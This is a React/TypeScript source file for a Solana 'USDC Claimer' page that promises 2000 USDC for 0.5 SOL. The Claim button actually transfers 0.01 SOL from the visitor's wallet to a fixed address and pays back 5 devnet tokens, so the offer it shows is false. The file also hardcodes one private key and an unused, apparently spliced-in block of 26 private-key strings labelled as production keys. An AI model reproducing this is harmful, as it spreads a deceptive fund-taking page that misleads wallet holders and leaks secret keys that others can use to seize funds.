/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5a6kNzTCc7uc6cmgSfS4J7zuvorJ6WyNc6R1Na4dLVtRqv53oHkXgy1RzH25PorjXJLv1miBU57ffkfLofme48qu"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4Gq23n8mSgJCiyWf5q4nFmWbUAnSNMBWt7a433qRGFfPeoBty1XjwCakHxcNMDkYTqeQfXqVxBmNZVh38pC6cbHD",
  "key1": "4oyF9RUu1E9nLrJCsfGiGY5gP7NQumxT32yrdLGBUXQxoxhdvH6MERPWPfza1xb5Ki4PJX6t1RaWQC9pBh9qnYic",
  "key2": "4tx7wFTrdxKo9tdBNiU8aJ6sPZ6hXz4WjEvBwGFnC8WwTiHaioJqVfNdQdQh88BKnZ8CT6jkjFMiACvQq432v7xk",
  "key3": "4smGwTVepL4DHyQoPNK6WYxbZGzU7eJMAsZ7GwFnAvi4mvFgfyxBdidzfQnvea19ACoQaSoRBu9e5HS7PSTJW3SF",
  "key4": "5AEe9eJBLycfWKfvjb5MKNCtBWzB1eaZESxrJHuMReXdqSq9rmFKLCLU25atAnr22tMxkgzGUjuVjjMr44UbFyj4",
  "key5": "2SExX7jxbhDvnw2Xk7AztN5rr4XC6ziLmXaKpNWeUawRXFZree2upnZfe23ejrvyEs4TZHazNFwQKUoqAVWqwAWx",
  "key6": "47HcWa4futbU8c6vzV65kgCZtUfYyMrMKaTVgQqAjWLwVuMhmVm8UANQufDRSibDdJbWXWHQZpSBjC2kFYp3Kpq3",
  "key7": "5DJFiFnSALTup6mrrXc9jNS2hsnNnMRY5RQa8oTeQkraFtWoXWPWXBD22aahD6oKjVeXaLYF8C5SsWeiko892GTw",
  "key8": "4GqrjG3DQ4hXtXD3jZdpxckrdEiaSJKWPU1U2ApgzoEKU6ZCv2BRAk1Fa7hm4od2pUuR6vEVmsMHkWHcDetnnp4h",
  "key9": "4s9NiE6Pk6ApfFpWAG6EEZWr17yvXNPyhhXLzmjMErcY5iDcc7na3JzTeii3c6J59UJm7Bz7bTJzLFKnahPmhJnu",
  "key10": "3XSbjnRp2b5ov3F2uiCpd71tGcFUT28pWerGkA7Cod9a7TUp9hoBQKfHLUFtr8ukJ2MT1KWu2enfK3tkt6NWPZwb",
  "key11": "4aSRYQ5x52FdXWCnYnqMcby7cuNbQoXomNh65QxXwASY6LJQcrL7QRyNwjNj99r8Ss8GUpvA1nnu72KZ2g5UYLv8",
  "key12": "3ne2yBu7pGoRg2iDX1HpnEgCvBN61ukakutoTtcBxbiNfEFj3miSpvdLSAc52pCcMQfuc65qHekhHMEx5zv8qwo5",
  "key13": "45aCEyEPFAjSRDLe8j3Xv6HRtYZ7iPCq2sxqaTUY5UHy4kq4ybtoyUGHuGTMxgRx44EZjfdDKMW9YQuWPL1M87gn",
  "key14": "512oh6YZAaEdEqHYaGUe3H76kSLZiFd2kLD3YkPYL5EuF5mLT2uKoK9HYfw7fPFPYjB5yuXWBh9Sv6UYsCq9yqR3",
  "key15": "4FZwoWBbuzHCeYz1Dg2hrssqVQ7yXUDdVM3RvBPc1xF4meonATJkcmM2zrtfsXFChg6WfKY6xPPLYXP9P44jdXXW",
  "key16": "4ft87dpSQDq2GMgzLYQCh5YscovwLQ4h6LssVhmkSnL7SLwdTLs6GTY9Vk9kKUCm7iTsGH45unob3FgHqduQ4bgj",
  "key17": "66APKDeBBM1sREPSZAPRRHmjdFDkHZAagGpWfAWSEwf8azcVaVZz7cjWk9oMR5SH7ZsnJKh7WHL21BLWPyM26Unn",
  "key18": "WgCZipvdcc4ibfjxoMeFof62dZZz3drG4fe3oUM9pqdzzKfpCVJYUDWZcwj5fYrjJqx6ibSHuHMrBFd4p7TYRZk",
  "key19": "4s7ZWgn2CreZCMRSbjDYeNnQfoJx3MoKFvGDAULAB4cNfXyiiBXm3bjaVryTEPSfah6Xdo5FwjpCwDf4m7zCjCyE",
  "key20": "433481asf3PvABjEYKYskRjJfnt3o3SZSuzoE5nRrR28qhsK9HtJz3GyLt7AJr69Dxq4pJiAhogDrxQP7oLkfpNE",
  "key21": "4bSzgLP7zPdF6d1tUeWXiMcnLJkjj19uKcxVCVj74FKZv4MybLUWVQD2vni6q9de2uwY3srnhVJ9KQ9e2fZK2e4i",
  "key22": "4GrYd5qnLfUPsQCvMg6A1vmSwLQ2j5adEPA9jbqihsLgBE2CCbQPY4TXrAEKSHidGDE7ens1Zhvne4nKDiFtWbfE",
  "key23": "4YtKbeBghs4CJi5QTfouj1CAZoibCJJkXQSW95YHiXg6CYxgPMMmwjUGYiLe6vXy16phkUffp7CqJ35m57c66if",
  "key24": "5Zm9B9k9nM3uqos1M9HuUkJs4jUYzVWU13KdDwdpw6T2eTH6gwoF8WWspzZPkhp5vxTzL615wHHfEC7GMY6asxAH",
  "key25": "5GmqPeMmFXfzPHYNz2xEiiZDj2i2DknACUukd54DrQqJsFZ4j5zEiJmuJw4KW6eB98mUHQmF66gfTAb8jfj7Pzti"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
